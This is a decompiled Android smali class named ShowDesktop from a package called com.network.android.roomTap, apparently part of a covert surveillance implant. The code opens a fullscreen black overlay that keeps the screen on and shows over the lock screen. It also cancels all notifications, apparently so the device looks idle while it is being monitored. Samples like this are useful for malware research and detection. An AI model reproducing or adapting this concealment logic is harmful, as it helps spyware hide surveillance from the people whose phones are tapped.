.class public Lcom/network/android/roomTap/ShowDesktop;
.super Landroid/app/Activity;


# static fields
.field public static c:J

.field public static d:Z

.field public static e:Ljava/lang/String;


# instance fields
.field a:Landroid/widget/LinearLayout;

.field b:Landroid/widget/ImageView;

.field private f:Landroid/view/View;

.field private g:Landroid/os/Handler;

.field private h:Landroid/content/BroadcastReceiver;

.field private i:Ljava/lang/Runnable;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/network/android/roomTap/ShowDesktop;->c:J

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/ShowDesktop;->d:Z

    const/4 v0, 0x0

    sput-object v0, Lcom/network/android/roomTap/ShowDesktop;->e:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->g:Landroid/os/Handler;

    new-instance v0, Lcom/network/android/roomTap/q;

    invoke-direct {v0, p0}, Lcom/network/android/roomTap/q;-><init>(Lcom/network/android/roomTap/ShowDesktop;)V

    iput-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->h:Landroid/content/BroadcastReceiver;

    new-instance v0, Lcom/network/android/roomTap/r;

    invoke-direct {v0, p0}, Lcom/network/android/roomTap/r;-><init>(Lcom/network/android/roomTap/ShowDesktop;)V

    iput-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->i:Ljava/lang/Runnable;

    return-void
.end method

.method static synthetic a(Lcom/network/android/roomTap/ShowDesktop;)V
    .locals 2

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/ShowDesktop;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/NotificationManager;->cancel(I)V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    sget-boolean v0, Lcom/network/android/roomTap/k;->a:Z

    if-nez v0, :cond_0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const-string v0, "ShowDesktop onCreate. isCreatingFiltersAllowed = false. returning "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-string v2, "com.network.showdesktop"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/ShowDesktop;->finish()V

    :goto_0
    return-void

    :cond_0
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const-string v0, "ShowDesktop onCreate"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :try_start_0
    iget-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->h:Landroid/content/BroadcastReceiver;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "com.network.showdesktop"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lcom/network/android/roomTap/ShowDesktop;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/ShowDesktop;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Lcom/network/android/roomTap/ShowDesktop;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x400

    const/16 v2, 0x400

    invoke-virtual {v0, v1, v2}, Landroid/view/Window;->setFlags(II)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/ShowDesktop;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/high16 v1, 0x80000

    const/high16 v2, 0x80000

    invoke-virtual {v0, v1, v2}, Landroid/view/Window;->setFlags(II)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/ShowDesktop;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/high16 v1, 0x100000

    const/high16 v2, 0x100000

    invoke-virtual {v0, v1, v2}, Landroid/view/Window;->setFlags(II)V

    const v0, 0x7f020001

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/ShowDesktop;->setContentView(I)V

    const/high16 v0, 0x7f050000

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/ShowDesktop;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/LinearLayout;

    iput-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->a:Landroid/widget/LinearLayout;

    iget-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->a:Landroid/widget/LinearLayout;

    invoke-virtual {v0}, Landroid/widget/LinearLayout;->getRootView()Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->f:Landroid/view/View;

    iget-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->f:Landroid/view/View;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/view/View;->setDrawingCacheEnabled(Z)V

    const v0, 0x7f050001

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/ShowDesktop;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ImageView;

    iput-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->b:Landroid/widget/ImageView;

    invoke-virtual {p0}, Lcom/network/android/roomTap/ShowDesktop;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x7d4

    invoke-virtual {v0, v1}, Landroid/view/Window;->setType(I)V

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/ShowDesktop;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0}, Landroid/app/NotificationManager;->cancelAll()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/roomTap/ShowDesktop;->d:Z

    const-string v0, "Show Black Desktop"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ShowDesktop onCreate Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_0
.end method

.method protected onDestroy()V
    .locals 2

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    const-string v0, "Show onDestroy"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :try_start_0
    iget-object v0, p0, Lcom/network/android/roomTap/ShowDesktop;->h:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/ShowDesktop;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/network/android/roomTap/ShowDesktop;->c:J

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/ShowDesktop;->d:Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onResume()V
    .locals 4

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    sput-wide v0, Lcom/network/android/roomTap/ShowDesktop;->c:J

    const-string v0, "ShowDesktop: onResume: "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    return-void
.end method
